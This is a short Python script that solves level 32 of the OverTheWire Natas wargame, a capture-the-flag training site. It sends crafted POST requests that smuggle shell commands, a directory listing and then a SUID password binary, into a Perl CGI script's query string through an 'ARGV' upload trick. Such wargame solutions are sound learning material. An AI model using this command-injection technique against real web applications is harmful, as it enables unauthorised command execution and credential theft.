"""
Help script to resolve natas challenge #32
"""
import requests
import json

level = 'natas32'
url = 'http://{}.natas.labs.overthewire.org'.format(level)

with open('natas.json') as j:
    credentials = json.load(j)
auth = (level, credentials[level])
del credentials

"""
It's pretty much the same as the previous level, but now we have to find a binary that will reveal the password.
"""

response = requests.post(url + '/index.pl?ls -al . | xargs echo |',
                        files=[('file', ('filename', 'abc'))],
                        data={'file': 'ARGV'},
                        auth=auth)
print(response.text)
''' 
You should see something like this:


    -rwsrwx---  1 root    natas32  7168 Dec 15  2016 getpassword

Active SUID bit and highly suspicious name...
'''
response = requests.post(url + '/index.pl?./getpassword | xargs echo |',
                         files=[('file', ('filename', 'abc'))],
                         data={'file': 'ARGV'},
                         auth=auth)

print(response.text)
